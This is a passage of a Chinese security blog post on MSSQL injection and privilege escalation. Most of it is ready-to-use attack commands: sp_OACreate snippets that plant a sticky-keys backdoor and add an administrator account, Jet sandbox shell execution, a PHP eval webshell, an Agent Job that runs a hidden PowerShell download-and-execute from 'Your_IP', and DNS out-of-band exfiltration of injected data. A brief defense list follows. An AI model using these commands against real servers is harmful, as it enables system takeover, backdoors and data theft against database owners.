+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">开启沙盒：</div><div class="line">exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Jet\4.0\Engines&apos;,&apos;SandBoxMode&apos;,&apos;REG_DWORD&apos;,1</div><div class="line">执行命令:</div><div class="line">select * from openrowset(&apos;microsoft.jet.oledb.4.0&apos;,&apos;;database=c:\windows\system32\ias\dnary.mdb&apos;,&apos;select shell(&quot;whoami&quot;)&apos;)</div></pre></td></tr></table></figure>
+<h3 id="sp_oacreate">SP_OACREATE</h3>
+<p>其实xp_cmdshell一般会删除掉了,如果xp_cmdshell 删除以后，可以使用SP_OACreate<br>
+需要注意的是这个组件是无回显的,你可以把他直接输出到web目录下的文件然后读取</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">激活命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1.EXEC sp_configure ‘show advanced options’, 1</td>
+</tr>
+<tr>
+<td style="text-align:left">2.EXEC sp_configure reconfigure</td>
+</tr>
+<tr>
+<td style="text-align:left">3.EXEC sp_configure ‘Ole Automation Procedures’, 1</td>
+</tr>
+<tr>
+<td style="text-align:left">4.EXEC sp_configure reconfigure</td>
+</tr>
+</tbody>
+</table>
+<p>下面是收集来的<code>sp_OACreate</code>的一些命令:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">解释</th>
+<th style="text-align:left">命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">sp_OACreate复制文件</td>
+<td style="text-align:left">declare @o int<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘copyfile’,null,‘c:\windows\explorer.exe’ ,‘c:\windows\system32\sethc.exe’;</td>
+</tr>
+<tr>
+<td style="text-align:left">sp_OACreate删除文件</td>
+<td style="text-align:left">DECLARE @Result int<br>DECLARE @FSO_Token intEXEC @Result = sp_OACreate ‘Scripting.FileSystemObject’,@FSO_Token OUTPUTEXEC @Result = sp_OAMethod @FSO_Token, ‘DeleteFile’, NULL, 'C:\1.txt’<br>EXEC @Result = sp_OADestroy @FSO_Token</td>
+</tr>
+<tr>
+<td style="text-align:left">sp_OACreate移动文件</td>
+<td style="text-align:left">declare @aa int<br>exec sp_oacreate ‘scripting.filesystemobject’, @aa out<br>exec sp_oamethod @aa, ‘moveFile’,null,‘c:\test.txt’, ‘c:\test1.txt’;</td>
+</tr>
+<tr>
+<td style="text-align:left">sp_OACreate加管理员用户</td>
+<td style="text-align:left">DECLARE @js int<br>EXEC sp_OACreate ‘ScriptControl’,@js OUT<br>EXEC sp_OASetProperty @js, ‘Language’, 'JavaScript’<br>EXEC sp_OAMethod @js, ‘Eval’, NULL, ‘var o=new <br>ActiveXObject(“Shell.Users”);z=o.create(“user”);z.changePassword(“pass”,&quot;&quot;);z.setting(“AccountType”)=3;’</td>
+</tr>
+</tbody>
+</table>
+<h3 id="agent-job">Agent Job</h3>
+<p>关于Agent job执行命令的这种情况是需要开启了MSSQL Agent Job服务才能执行,这里列出命令,具体的原理在安全客已经有过总结<a href="http://bobao.360.cn/learning/detail/3070.html" target="_blank" rel="external">这里</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">USE msdb;</div><div class="line">EXEC dbo.sp_add_job @job_name = N&apos;clay_powershell_job1&apos; ; </div><div class="line">EXEC sp_add_jobstep </div><div class="line">	@job_name = N&apos;clay_powershell_job1&apos;, </div><div class="line">	@step_name = N&apos;clay_powershell_name1&apos;, </div><div class="line">	@subsystem = N&apos;PowerShell&apos;, </div><div class="line">	@command = N&apos;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;&apos;http://Your_IP/Your_file&apos;&apos;))&quot;&apos;, </div><div class="line">	@retry_attempts = 1, </div><div class="line">	@retry_interval = 5;</div><div class="line">EXEC dbo.sp_add_jobserver </div><div class="line">	@job_name = N&apos;clay_powershell_job1&apos;; </div><div class="line">EXEC dbo.sp_start_job N&apos;clay_powershell_job1&apos;;</div></pre></td></tr></table></figure>
+<h3 id="else">Else</h3>
+<p>MSSQL还有其他的很多存储过程可以调用,下面做一个小列举,有兴趣的朋友可以逐一研究:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Item</th>
+<th style="text-align:left">Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left">Registry Stuff (xp_regread)</td>
+</tr>
+<tr>
+<td style="text-align:left">2</td>
+<td style="text-align:left">Managing Services (xp_servicecontrol)</td>
+</tr>
+<tr>
+<td style="text-align:left">3</td>
+<td style="text-align:left">Medias (xp_availablemedia)</td>
+</tr>
+<tr>
+<td style="text-align:left">4</td>
+<td style="text-align:left">ODBC Resources (xp_enumdsn)</td>
+</tr>
+<tr>
+<td style="text-align:left">5</td>
+<td style="text-align:left">Login mode (xp_loginconfig)</td>
+</tr>
+<tr>
+<td style="text-align:left">6</td>
+<td style="text-align:left">Creating Cab Files (xp_makecab)</td>
+</tr>
+<tr>
+<td style="text-align:left">7</td>
+<td style="text-align:left">Domain Enumeration (xp_ntsec_enumdomains)</td>
+</tr>
+<tr>
+<td style="text-align:left">8</td>
+<td style="text-align:left">Process Killing (need PID) (xp_terminate_process)</td>
+</tr>
+<tr>
+<td style="text-align:left">9</td>
+<td style="text-align:left">Add new procedure (virtually you can execute whatever you want)</td>
+</tr>
+<tr>
+<td style="text-align:left">10</td>
+<td style="text-align:left">sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’</td>
+</tr>
+<tr>
+<td style="text-align:left">11</td>
+<td style="text-align:left">exec xp_webserver</td>
+</tr>
+<tr>
+<td style="text-align:left">12</td>
+<td style="text-align:left">Write text file to a UNC or an internal path (sp_makewebtask)</td>
+</tr>
+</tbody>
+</table>
+<p>下面是关于一些存储过程调用的例子:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Item</th>
+<th style="text-align:left">Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">sp_makewebtask 写shell</td>
+<td style="text-align:left">exec sp_makewebtask ‘c:\windows.txt’,’ select ‘’&lt;%25php @eval($_POST[‘clay’])%25&gt;’’ ';;–</td>
+</tr>
+<tr>
+<td style="text-align:left">wscript.shell</td>
+<td style="text-align:left">use master<br>declare @o int<br>exec sp_oacreate ‘wscript.shell’,@o out<br>exec sp_oamethod @o,‘run’,null,‘cmd /c “net user” &gt; c:\test.tmp’</td>
+</tr>
+<tr>
+<td style="text-align:left">Shell.Application</td>
+<td style="text-align:left">declare @o int<br>exec sp_oacreate ‘Shell.Application’, @o out<br>exec sp_oamethod @o, ‘ShellExecute’,null, ‘cmd.exe’,‘cmd /c net user &gt;c:\test.txt’,‘c:\windows\system32’,’’,‘1’;<br>or<br>exec sp_oamethod @o, ‘ShellExecute’,null, ‘user.vbs’,’’,‘c:’,’’,‘1’;</td>
+</tr>
+<tr>
+<td style="text-align:left">沙盒</td>
+<td style="text-align:left">exec master…xp_regwrite ‘HKEY_LOCAL_MACHINE’,‘SOFTWARE\Microsoft\Jet\4.0\Engines’,‘SandBoxMode’,‘REG_DWORD’,1 默认为3<br>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database=c:\windows\system32\ias\ias.mdb’,‘select shell(“cmd.exe /c echo a&gt;c:\b.txt”)’)</td>
+</tr>
+<tr>
+<td style="text-align:left">public 提权</td>
+<td style="text-align:left">USE msdb<br>EXEC sp_add_job @job_name = ‘GetSystemOnSQL’, <a href="http://www.test.com" target="_blank" rel="external">www.test.com</a><br>@enabled = 1,<br>@description = ‘This will give a low privileged user access to<br>xp_cmdshell’,<br>@delete_level = 1<br>EXEC sp_add_jobstep @job_name = ‘GetSystemOnSQL’,<br>@step_name = ‘Exec my sql’,<br>@subsystem = ‘TSQL’,<br>@command = ‘exec master…xp_execresultset N’‘select ‘’’‘exec<br>master…xp_cmdshell “dir &gt; c:\agent-job-results.txt”’’’’’’,N’‘Master’’'<br>EXEC sp_add_jobserver @job_name = ‘GetSystemOnSQL’,<br>@server_name = 'SERVER_NAME’<br>EXEC sp_start_job @job_name = ‘GetSystemOnSQL’</td>
+</tr>
+</tbody>
+</table>
+<h2 id="out-of-band">Out-of-Band</h2>
+<p>关于带外注入在上一篇文章已经有讲到,但DNS注入只讲了利用,这里做了一张图为大家讲解,同样的SMB Relay Attack 也是存在的,可自行实现.</p>
+<p>下图就是DNS注入中的请求过程<br>
+<img src="http://i2.muimg.com/567571/18d522d916c70af0.png" alt="SQL注入中的DNS请求"></p>
+<p>那么SQL Server的DNS注入和MySQl稍有不容,但都是利用了SMB协议</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Param=1; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> OPENROWSET(<span class="string">'SQLOLEDB'</span>, (&#123;INJECT&#125;)+<span class="string">'.rootclay.club'</span>;'sa';'pwd', '<span class="keyword">SELECT</span> <span class="number">1</span><span class="string">')</span></div></pre></td></tr></table></figure>
+<p>Makes DNS resolution request to {INJECT}.rootclay.club</p>
+<h2 id="防御">防御</h2>
+<p>对于代码上的防御在上一篇文章已有总结,就不多BB了…这里主要说一下存储过程方面的东西</p>
+<ol>
+<li>设置TRUSTWORTHY为off<code>ALTER DATABASE master SET TRUSTWORTHY OFF</code></li>
+<li>确保你的存储过程的权限不是sysadmin权限的</li>
+<li>对于 PUBLIC用户是不能给存储过程权限的<code>REVOKE EXECUTE ON 存储过程 to PUBLIC</code></li>
+<li>对于自己不需要的存储过程最好删除</li>
+<li>当然,在代码方面就做好防御是最好的选择,可以参见上篇文章</li>
+</ol>
+<h2 id="参考">参考</h2>
+<p><a href="http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-slides.pdf" target="_blank" rel="external">http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-slides.pdf</a><br>
+<a href="http://colesec.inventedtheinternet.com/hacking-sql-server-with-xp_cmdshell/" target="_blank" rel="external">http://colesec.inventedtheinternet.com/hacking-sql-server-with-xp_cmdshell/</a><br>
+<a href="http://www.cnblogs.com/zhycyq/articles/2658225.html" target="_blank" rel="external">http://www.cnblogs.com/zhycyq/articles/2658225.html</a><br>
+<a href="https://evi1cg.me/tag/mssql/" target="_blank" rel="external">https://evi1cg.me/tag/mssql/</a><br>
+<a href="http://404sec.lofter.com/post/1d16b278_6329f6d" target="_blank" rel="external">http://404sec.lofter.com/post/1d16b278_6329f6d</a></p>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2017/05/10/内网/" data-toggle="tooltip" data-placement="top" title="内网渗透">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2017/04/21/MySQL注入攻击与防御/" data-toggle="tooltip" data-placement="top" title="MySQL注入攻击与防御">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                    <div class="comment">
+                        <div id="disqus_thread" class="disqus-thread"></div>
+                    </div>
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#mssql注入攻击与防御"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MSSQL注入攻击与防御</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#系统库"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">系统库</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#注释"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">注释</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#版本amp数据库当前用户amp主机名"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">版本&数据库当前用户&主机名</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#版本"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">版本</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#数据库当前用户"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">数据库当前用户</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#主机名"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">主机名</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#库amp表amp列"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">库&表&列</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#库名"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">库名</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#测试列数"><span class="toc-nav-number">1.4.2.</span> <span class="toc-nav-text">测试列数</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#获取表名"><span class="toc-nav-number">1.4.3.</span> <span class="toc-nav-text">获取表名</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#获取列名"><span class="toc-nav-number">1.4.4.</span> <span class="toc-nav-text">获取列名</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#接收多条数据"><span class="toc-nav-number">1.4.4.1.</span> <span class="toc-nav-text">接收多条数据</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#临时表"><span class="toc-nav-number">1.4.4.1.1.</span> <span class="toc-nav-text">临时表</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#xml列数据"><span class="toc-nav-number">1.4.4.1.2.</span> <span class="toc-nav-text">XML列数据</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#字符串连接符"><span class="toc-nav-number">1.4.5.</span> <span class="toc-nav-text">字符串连接符</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#条件语句amp时间"><span class="toc-nav-number">1.4.6.</span> <span class="toc-nav-text">条件语句&时间</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#条件语句"><span class="toc-nav-number">1.4.6.1.</span> <span class="toc-nav-text">条件语句</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#时间"><span class="toc-nav-number">1.4.6.2.</span> <span class="toc-nav-text">时间</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#文件"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">文件</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#查看文件权限"><span class="toc-nav-number">1.5.1.</span> <span class="toc-nav-text">查看文件权限</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#定位数据库文件"><span class="toc-nav-number">1.5.2.</span> <span class="toc-nav-text">定位数据库文件</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#绕过技巧"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">绕过技巧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#绕过引号"><span class="toc-nav-number">1.6.1.</span> <span class="toc-nav-text">绕过引号</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#16进制转换绕过"><span class="toc-nav-number">1.6.2.</span> <span class="toc-nav-text">16进制转换绕过</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#mssql提权"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">MSSQL提权</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#xp_cmdshell"><span class="toc-nav-number">1.7.1.</span> <span class="toc-nav-text">xp_cmdshell</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#xp_dirtree"><span class="toc-nav-number">1.7.2.</span> <span class="toc-nav-text">xp_dirtree</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#openrowset"><span class="toc-nav-number">1.7.3.</span> <span class="toc-nav-text">OPENROWSET</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#沙盒"><span class="toc-nav-number">1.7.4.</span> <span class="toc-nav-text">沙盒</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#sp_oacreate"><span class="toc-nav-number">1.7.5.</span> <span class="toc-nav-text">SP_OACREATE</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#agent-job"><span class="toc-nav-number">1.7.6.</span> <span class="toc-nav-text">Agent Job</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#else"><span class="toc-nav-number">1.7.7.</span> <span class="toc-nav-text">Else</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#out-of-band"><span class="toc-nav-number">1.8.</span> <span class="toc-nav-text">Out-of-Band</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#防御"><span class="toc-nav-number">1.9.</span> <span class="toc-nav-text">防御</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#参考"><span class="toc-nav-number">1.10.</span> <span class="toc-nav-text">参考</span></a></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Web" title="Web">Web</a>
+                        
+                          <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://beantech.org" target="_blank">Bean Tech</a></li>
+                    
+                        <li><a href="http://blog.kaijun.rocks" target="_blank">Kaijun&#39;s Blog</a></li>
+                    
+                        <li><a href="http://huangxuan.me" target="_blank">Hux Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">It Helps SEO</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus embedded js code start (one page only need to embed once) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "your-disqus-ID";
+    var disqus_identifier = "http://rootclay.github.io/2017/05/04/MSSQL注入攻击与防御/";
+    var disqus_url = "http://rootclay.github.io/2017/05/04/MSSQL注入攻击与防御/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus embedded js code start end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/xiang-shan-74-8">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/u/5715481982">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/rootclay">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Rootclay 2017 
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://rootclay.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<!-- <img src="http://rootclay.github.io/img/icon_wechat.png" width="0" height="0" /> -->
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
